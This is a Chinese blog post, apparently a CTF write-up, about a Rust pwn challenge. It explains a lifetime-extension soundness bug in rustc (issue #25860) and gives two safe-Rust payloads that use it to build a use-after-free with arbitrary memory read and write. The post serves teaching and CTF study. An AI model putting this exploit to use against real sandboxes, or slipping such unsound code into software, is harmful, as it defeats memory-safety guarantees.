---
title: Rust之殇——安全的边界
date: 2020-03-09 11:45:02
tags: 
  - "Rust"
  - "pwn" 
cover: /img/IMG_20200309_012646_444.jpg
---
说是“殇”，其实也没有多么严重，只不过想谈谈昨天做的一道Rust pwn。
## Rustpad
题目里给了一个cargo项目，文件结构大概是这样的
```
λ Doughnut source → tree
.
├── Cargo.lock
├── Cargo.toml
├── exp.py
├── lib
│   └── code
│       ├── Cargo.lock
│       ├── Cargo.toml
│       └── src
│           └── lib.rs
├── pwn
├── pwn.c
└── src
    ├── main.rs
    └── main.rs.tpl

4 directories, 10 files
```
再看看让这个项目跑起来的两个主要文件
```rust
// main.rs
#![no_std]

extern crate code;

use code::code;
fn main() {
    let flag = "";
    code();
}
```
```rust
// lib.rs
pub fn code(){}
```
pwn.c里大概是这么一套逻辑  
1. 创建随机文件夹/tmp/XXXXX，接着把整个项目复制过去
2. 修改./src/main.rs，把flag的值填到flag里面
3. 将payload写入./lib/code/src/lib.rs，顺便过滤了许多东西，包括unsafe、macro、std、use等
4. cargo run  

所以很显然，safe的rust又要unsafe了。

## Black Hole
根据作者的提示，看到了这样一个[issue](https://github.com/rust-lang/rust/issues/25860)，产生漏洞的大概是这样一段代码
```rust
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T {
    v
}

fn bad<'b, T>(x: &'b T) -> &'static T {
    let f: fn(_, &'b T) -> &'static T = foo;
    f(UNIT, x)
}
```
稍微分析一下吧，第一行创建了一个静态的全局变量`UNIT`，类型为`&'static &'static ()`，一个指向底类型的静态引用的静态引用，套了个娃。  
接着是一个模板函数`foo`，`foo`有三个模板参数`'a`,`'b`，`T`，重点关注两个生命周期参数。在接受的两个参数中，第一个是个引用的引用，根据生命周期的基本规则，内部引用的生命周期必定要长于外层的，因此这里隐式的要求了`'b:'a`。同时第二个参数`&'b T`被直接返回，`'b`会变成`'a`，发生了协变，很合理，没有毛病。  
但是在`bad`里，开始不对劲了起来。函数签名中表示我们接受了一个任意引用，返回了一个静态引用？这当然是可行的，因为很可能这个返回并没有参与协变与逆变。继续看，将`foo`绑定到了`f`上，这时，问题出现了。  
`f`的类型为`fn(_, &'b T) -> &'static T`，绑定的过程中抹去了第一个参数同时没有引发编译器报错！根据这个签名，我们可以推断出`foo`选择了`<'static, 'b , T>`进行了单态化，而这是不符合`'b:'a`规则的！纠正这个问题很简单，只需修改`foo`的定义，显式的给出类型约束
```rust
fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T
where
    'b: 'a,
{
    v
}
```
当然，我们现在不是来修洞的。`f(UNIT, x)`的调用完成了开洞的最后一步，它将传入变量的引用无限延长后传了出去，只需调用这个函数，就能打破引用声明的要求。
```rust
let a: &String; //of course not.
{
    let x = String::from("NO! you shall not pass here!");
    a = &x;
  //    ^^ borrowed value does not live long enough
} // - `x` dropped here while still borrowed
println!("{}", a);
//             - borrow later used here
// BUT……
let a: &String;
{
    let x = String::from("NO! you shall not pass here!");
    a = bad(&x); // WOW!
}
println!("{}", a);
```
## 逃离伊甸
Rust依靠声明周期与type check为我们创造的safe伊甸园出现了漏洞，此刻便是出逃之时。  
很容易就能想到这样的方法，通过修改String中的指针指向来获得任意地址读的能力
```rust
pub fn code() {
    let mut pa;
    {
        let b = vec![
            String::from("aaaaa"),
            String::new(),
            String::new(),
            String::new(),
        ];
        pa = bad(&b);
    }
    {
        let x = "aaaaa".as_ptr() as i64;
        let b: Vec<i64> = vec![x - 0x30, 5, 5, 1, 0, 0, 1, 0, 0, 1, 0, 0];
        println!("{:?}", pa);
    }
}
```
在这里再说一说rust的胖指针，在`Vec`,`String`等中，实际上有三个成员变量，第一个是raw_ptr，第二个是length，第三个则是capacity，在这段payload中，先在堆区创建了长度为4的`Vec<String>`，size为0x60，接着在声明周期结束后被释放，这时我们可以通过创建长度为12的`Vec<i64>`来重新获得这块空间，并改写值，完成uaf。  
当然，在这样的情况下，不光任意读，任意写也是随意做到的。
```rust
pub fn code() {
    let pa: &mut Vec<Vec<i64>>;
    {
        let mut b = vec![
            Vec::<i64>::new(),
            Vec::<i64>::new(),
            Vec::<i64>::new(),
            Vec::<i64>::new(),
        ];
        pa = bad(&mut b);
    }
    {
        let x = "aaaaa".as_ptr() as i64;
        let b: Vec<i64> = vec![x, 5, 5, 1, 0, 0, 1, 0, 0, 1, 0, 0];
        println!("{:?}", pa);
        pa[0][0] = 1; // random write here
    }
}
```
此时我们便可以实现地址的任意读写。
## 吾心安处是吾乡
在安全的Rust里搞出洞来已经不是一次了，如何写出安全的代码，这其实是个很克氏的问题。  
我曾经遭遇过一次信仰危机，软件工程让我确实明白了写出正确的代码是一件多么困难的事情——这很爱手艺，我们面对着如山一般的未名存在，它散发着令人窒息的味道，无论如何打量也无法明白它是如何行动的。程序员在面对屎山的过程里逐渐失去理智，变得疯狂，写下来的东西也逐渐变得难以理解，屎山难越，谁悲失控之人？  
那个时刻，我几乎变成了一个不可知论者，悲观的对编程这一事件感到绝望。但我撑过去了，形式化验证告诉了我，“正确的代码是存在的”！我从此刻明白，在日益增长的疯狂里，类型论是我们所能安心依靠的最后一堵壁垒。  
但是一切总归不会那样顺利，类型安全的rust还是能被人找到边界，然后撬开果壳。或许类型就是这样的东西，易守难攻，我们背靠它的时候无比可靠，但是失去它之后它会成为刺向我们的最锋利的矛。  
在过去的两个月里，我写了很多C++，现在我开始看到曾经极客的背影了。类型是好的盾，但是丢了，也只不过是一个人接着走。